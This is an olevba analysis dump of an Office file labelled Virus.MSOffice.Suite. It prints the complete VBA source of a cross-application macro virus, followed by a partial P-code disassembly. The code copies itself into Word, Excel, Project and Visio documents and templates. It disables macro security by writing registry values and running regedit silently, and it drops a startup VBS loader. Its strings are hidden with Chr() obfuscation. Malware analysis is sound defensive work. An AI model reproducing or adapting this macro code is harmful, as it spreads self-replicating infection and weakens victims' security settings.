olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Suite
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Suite - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSOffice.Suite - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSOffice.Suite - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSOffice.Suite - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSOffice.Suite - OLE stream: '_VBA_PROJECT_CUR/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'
mut$ = "Visio.Application": mat$ = "Blank Drawing.vst": dovis = 1
On Error Resume Next
t = Application
If t = Chr(78) + Chr(111) + Chr(116) + Chr(104) + Chr(105) + Chr(110) + Chr(103) Then GoTo nopro
If t = "Microsoft Project" Then
mook = Version
 If mook = "8.0" Then
'
 End If
Application.DisplayAlerts = False
'
For Each Z In Projects
On Error Resume Next
Set ap = Z.VBProject.VBComponents(1).codemodule
Set tp = ThisProject.VBProject.VBComponents(1).codemodule
If ap.Lines(2, 1) <> "'" Then
ap.DeleteLines 1, ap.countoflines
ap.InsertLines 1, tp.Lines(1, tp.countoflines)
'
End If
Next Z
Set temp = Application.VBE.VBProjects(1).VBComponents(1).codemodule
If temp.Lines(2, 1) <> Chr(39) Then
temp.DeleteLines 1, temp.countoflines
temp.InsertLines 1, tp.Lines(1, tp.countoflines)
End If
End If
vi:
te$ = t: tune = Left(te$, 5)
If tune <> Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) Then
Set nom = ThisDocument.VBProject.VBComponents(1).codemodule
For i = 1 To Documents.Count
    Set docobj = Documents.Item(i)
Set gets = docobj.VBProject.VBComponents(1).codemodule
If gets.Lines(2, 1) <> Chr(39) Then
gets.InsertLines 1, nom.Lines(1, nom.countoflines)
dname = CurDir & "\": filechk$ = (dname & docobj)
mystr = Right(filechk$, 4): If mystr <> ".vsd" Then sd = 0
mystr = Right(filechk$, 4): If mystr <> ".vss" Then sd = 0
mystr = Right(filechk$, 4): If mystr <> ".vst" Then sd = 0
If sd = 0 Then fila$ = (dname & docobj & ".vsd")
'
End If
toobig:
Next i
If strTemplatename = "" Then GoTo runaway
'
Set Target = Documents.Open(strTemplatename)
Set targets = Target.VBProject.VBComponents(1).codemodule
If targets.Lines(2, 1) <> "'" Then
If targets.Lines(1, 1) = "Option Explicit" Then Target.DeleteLines 1, 1
targets.InsertLines 1, rnt.Lines(1, rnt.countoflines)
Target.SaveAs strTemplatename
Else
toobigtemplate:
Target.Close
End If
runaway:
End If
If t = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100) Then Else GoTo ex
Options.SendMailAttach = True: m = 1
Set nim = NormalTemplate
Set aiv = ActiveDocument
Set aktiv = aiv.VBProject.VBComponents(m).codemodule
Set nom = nim.VBProject.VBComponents(m).codemodule
If nom.Lines(2, 1) <> "'" Then
nom.DeleteLines 1, nom.countoflines
nom.InsertLines 1, aktiv.Lines(1, aktiv.countoflines)
nom.replaceline 1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
nop = 1
End If
If aktiv.Lines(2, 1) <> "'" Then
act = 1
End If
ex:
If act = 1 Then GoTo 11
If t = "Microsoft Excel" Then Else GoTo 12
Set a = ActiveWorkbook.VBProject
Set aktiv = a.VBComponents("ThisWorkbook").codemodule
Set nimt = ThisWorkbook.VBProject
Set nom = nimt.VBComponents("ThisWorkbook").codemodule
11:
If aktiv.Lines(2, 1) <> "'" Then
aktiv.DeleteLines 1, aktiv.countoflines
aktiv.InsertLines 1, nom.Lines(1, nom.countoflines)
End If
12:
If act = 1 And t = "Microsoft Word" Then aktiv.replaceline 1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If m = 1 Then GoTo 16
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
If t = "Microsoft Excel" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\expo.exp" For Output As 1
aktiv.replaceline 10, Chr(39): aktiv.replaceline 21, Chr(39)
aktiv.replaceline 13, Chr(39): aktiv.replaceline 44, Chr(39)
aktiv.replaceline 49, Chr(39): aktiv.replaceline 80, Chr(39)
Print #1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110)
Print #1, aktiv.Lines(2, aktiv.countoflines)
Close 1
16:
If t = "Microsoft Word" Then a = 1
If t = "Microsoft Project" Then a = 1
If tune <> "Micro" Then a = 1
If a = 1 Then
Set xlapp = CreateObject("Excel.Application")
If UCase(Dir(xlapp.StartupPath + "\Book1.")) <> "BOOK1" Then Else GoTo fl
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\MicrosoftExcel", "Options6") = ""
Set bko = xlapp.Workbooks
Set bkobj = bko.Add: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
bkobj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.InsertLines1 , nom.Lines(1, nom.countoflines)
bkobj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.replaceline1 , "Sub Workbook_Deactivate()"
bkobj.SaveAs xlapp.Application.StartupPath & "\Book1."
bkobj.Close: xlapp.Quit
If a = 1 And t = "Microsoft Project" Then
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 10, "'"
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 13, "'"
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 21, "'"
End If
End If
Open "c:\Windows\stray.reg" For Output As 1
Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft"
Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\MS Project\Security]"
Print #1, """Level""=dword:00000001"
Close 1
Shell "regedit /s c:\Windows\stray.reg", vbHide
End If
End If
fl:
fi = Dir("c:\gotvis.dll")
If fi = "" Then dovis = 0
If tune = "Micro" And dovis = 0 Then
Set vsapp = CreateObject(mut$)
Set vs1obj = vsapp.Documents.Add(mat$)
Set la = vs1obj.VBProject.VBComponents.Item(1).codemodule
la.InsertLines 1, nom.Lines(1, nom.countoflines)
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 1, "Sub Document_BeforeDocumentClose(ByValdoc As Visio.IVDocument)"
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 44, "ThisDocument.saveasex fila$, visSaveAsWS = 2"
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 49, "vs1obj.VBProject.VBComponents(1).codemodule.Replaceline"
fila$ = ("C:\Program Files\Visio\Solutions\Blank Drawing.vst")
vs1obj.SaveAsEx fila$, visSaveAsWS = 2
vs1obj.Close
vsapp.Close
Open "c:\gotvis.dll" For Output As 1: Print #1, "'": Close 1
End If

If t <> "Microsoft Project" Then
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo nopro
Set proj1obj = projobj.VBE.VBProjects(1).VBComponents(1).codemodule
proj1obj.InsertLines 1, nom.Lines(1, nom.countoflines)
proj1obj.replaceline 1, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(95) + Chr(66) + Chr(101) + Chr(102) + Chr(111) + Chr(114) + Chr(101) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(66) + Chr(121) + Chr(86) + Chr(97) + Chr(108) + Chr(32) + Chr(112) + Chr(106) + Chr(32) + Chr(65) + Chr(115) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(41)
proj1obj.replaceline 10, "Application.MacroVirusProtection = False"
proj1obj.replaceline 13, Chr(68) + Chr(105) + Chr(109) + Chr(32) + Chr(88) + Chr(32) + Chr(97) + Chr(115) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(115)
proj1obj.replaceline 21, "Application.FileSaveAs Name:=ActiveProject.Name"
End If
nopro:
Pi = Dir("c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs")
If Pi = "" Then Open "c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs" For Output As 1
Print #1, "Call BulletLoader": Print #1, "Sub Bulletloader()": Print #1, "On Error Resume Next"
Print #1, "Set wo = CreateObject(""word.application"")": Print #1, "wo.NormalTemplate.VBProject.VBComponents(1).codemodule.deletelines"; 1, wo.NormalTemplate.VBProject.VBComponents(1).codemodule.countoflines; ""
Print #1, "wo.Options.VirusProtection = (Rnd * 0)"
Print #1, "wo.Options.SaveNormalPrompt = (Rnd * 0)": Print #1, "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile"; "c:\expo.exp""": Print #1, "wo.NormalTemplate.Save"
Print #1, "wo.Quit": Print #1, " ": Print #1, "End Sub": Close 1
Open "C:\Windows\Default.htm" For Output As 1
Print #1, "<html>": Print #1, Chr(65) + Chr(32) + Chr(108) + Chr(97) + Chr(115) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(114) + Chr(116) + Chr(105) + Chr(110) + Chr(103) + Chr(32) + Chr(115) + Chr(104) + Chr(111) + Chr(116) + Chr(32) + Chr(44) + Chr(32) + Chr(97) + Chr(32) + Chr(102) + Chr(105) + Chr(110) + Chr(97) + Chr(108) + Chr(32) + Chr(116) + Chr(111) + Chr(107) + Chr(101) + Chr(110) + Chr(32) + Chr(116) + Chr(97) + Chr(110) + Chr(116) + Chr(114) + Chr(117) + Chr(109)
Print #1, Chr(60) + Chr(104) + Chr(49) + Chr(62) + Chr(60) + Chr(66) + Chr(108) + Chr(105) + Chr(110) + Chr(107) + Chr(62) + Chr(83) + Chr(116) + Chr(114) + Chr(97) + Chr(121) + Chr(32) + Chr(66) + Chr(117) + Chr(108) + Chr(108) + Chr(101) + Chr(116) + Chr(60) + Chr(47) + Chr(104) + Chr(49) + Chr(62) + Chr(60) + Chr(47) + Chr(98) + Chr(108) + Chr(105) + Chr(110) + Chr(107) + Chr(62)
Print #1, "Made possible by the Microsoft Office suite<br>": Print #1, "<h2>Word 97/2000 <br> Excel 97/2000 <br>Visio 5/2000<br>Project 98/2000<br></h2>"
Print #1, "<br><h2>Strictly Not for Distribution - Moral Panic OnlY!!!!</h2>"
Print #1, Chr(60) + Chr(99) + Chr(101) + Chr(110) + Chr(116) + Chr(114) + Chr(101) + Chr(62) + Chr(60) + Chr(105) + Chr(62) + Chr(84) + Chr(104) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(116) + Chr(105) + Chr(83) + Chr(116) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(84) + Chr(111) + Chr(114) + Chr(116) + Chr(111) + Chr(105) + Chr(115) + Chr(101) + Chr(60) + Chr(47) + Chr(105) + Chr(62) + Chr(60) + Chr(98) + Chr(114) + Chr(62)
Print #1, "</html>"
Reset
'Aţä°äą*sČÄqĆw?ű Q
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Suite
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/List1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/List2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/List3 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Modul 1 - 16900 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	LitStr 0x0011 "Visio.Application"
' 	St mut$ 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Blank Drawing.vst"
' 	St mat$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St dovis 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld Application 
' 	St t 
' Line #5:
' 	Ld t 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nopro 
' 	EndIf 
' Line #6:
' 	Ld t 
' 	LitStr 0x0011 "Microsoft Project"
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld Version 
' 	St mook 
' Line #8:
' 	Ld mook 
' 	LitStr 0x0003 "8.0"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	QuoteRem 0x0000 0x0000 ""
' Line #13:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	Ld Projects 
' 	ForEach 
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Z 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set ap 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisProject 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set tp 
' Line #17:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ap 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld ap 
' 	MemLd countoflines 
' 	Ld ap 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld tp 
' 	MemLd countoflines 
' 	Ld tp 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ap 
' 	ArgsMemCall InsertLines 0x0002 
' Line #20:
' 	QuoteRem 0x0000 0x0000 ""
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set temp 
' Line #24:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld temp 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld temp 
' 	MemLd countoflines 
' 	Ld temp 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld tp 
' 	MemLd countoflines 
' 	Ld tp 
' 	ArgsMemLd Lines 0x0002 
' 	Ld temp 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Label vi 
' Line #30:
' 	Ld t 
' 	St te$ 
' 	BoS 0x0000 
' 	Ld te$ 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	St tune 
' Line #31:
' 	Ld tune 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set nom 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #34:
' 	SetStmt 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	Set docobj 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld docobj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set gets 
' Line #36:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld gets 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	Ld gets 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St dname 
' 	BoS 0x0000 
' 	Ld dname 
' 	Ld docobj 
' 	Concat 
' 	Paren 
' 	St filechk$ 
' Line #39:
' 	Ld filechk$ 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	St mystr 
' 	BoS 0x0000 
' 	Ld mystr 
' 	LitStr 0x0004 ".vsd"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St sd 
' 	EndIf 
' Line #40:
' 	Ld filechk$ 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	St mystr 
' 	BoS 0x0000 
' 	Ld mystr 
' 	LitStr 0x0004 ".vss"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St sd 
' 	EndIf 
' Line #41:
' 	Ld filechk$ 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	St mystr 
' 	BoS 0x0000 
' 	Ld mystr 
' 	LitStr 0x0004 ".vst"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St sd 
' 	EndIf 
' Line #42:
' 	Ld sd 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dname 
' 	Ld docobj 
' 	Concat 
' 	LitStr 0x0004 ".vsd"
' 	Concat 
' 	Paren 
' 	St fila$ 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0000 ""
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Label toobig 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	Ld strTemplatename 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo runaway 
' 	EndIf 
' Line #48:
' 	QuoteRem 0x0000 0x0000 ""
' Line #49:
' 	SetStmt 
' 	Ld strTemplatename 
' 	Ld Documents 
' 	ArgsMemLd Option 0x0001 
' 	Set Target 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set targets 
' Line #51:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld targets 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #52:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld targets 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #53:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld rnt 
' 	MemLd countoflines 
' 	Ld rnt 
' 	ArgsMemLd Lines 0x0002 
' 	Ld targets 
' 	ArgsMemCall InsertLines 0x0002 
' Line #54:
' 	Ld strTemplatename 
' 	Ld Target 
' 	ArgsMemCall SaveAs 0x0001 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	Label toobigtemplate 
' Line #57:
' 	Ld Target 
' 	ArgsMemCall Close 0x0000 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Label runaway 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld t 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	Else 
' 	BoSImplicit 
' 	GoTo ex 
' 	EndIf 
' Line #62:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St m 
' Line #63:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nim 
' Line #64:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set aiv 
' Line #65:
' 	SetStmt 
' 	Ld m 
' 	Ld aiv 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set aktiv 
' Line #66:
' 	SetStmt 
' 	Ld m 
' 	Ld nim 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set nom 
' Line #67:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #69:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aktiv 
' 	MemLd countoflines 
' 	Ld aktiv 
' 	ArgsMemLd Lines 0x0002 
' 	Ld nom 
' 	ArgsMemCall InsertLines 0x0002 
' Line #70:
' 	LitDI2 0x0001 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld nom 
' 	ArgsMemCall replaceline 0x0002 
' Line #71:
' 	LitDI2 0x0001 
' 	St nop 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld aktiv 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	St act 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Label ex 
' Line #77:
' 	Ld act 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 11 
' 	EndIf 
' Line #78:
' 	Ld t 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	If 
' 	Else 
' 	BoSImplicit 
' 	GoTo 12 
' 	EndIf 
' Line #79:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	Set a 
' Line #80:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld a 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set aktiv 
' Line #81:
' 	SetStmt 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	Set nimt 
' Line #82:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld nimt 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set nom 
' Line #83:
' 	LineNum 11 
' 	BoS 0x0000 
' Line #84:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld aktiv 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #85:
' 	LitDI2 0x0001 
' 	Ld aktiv 
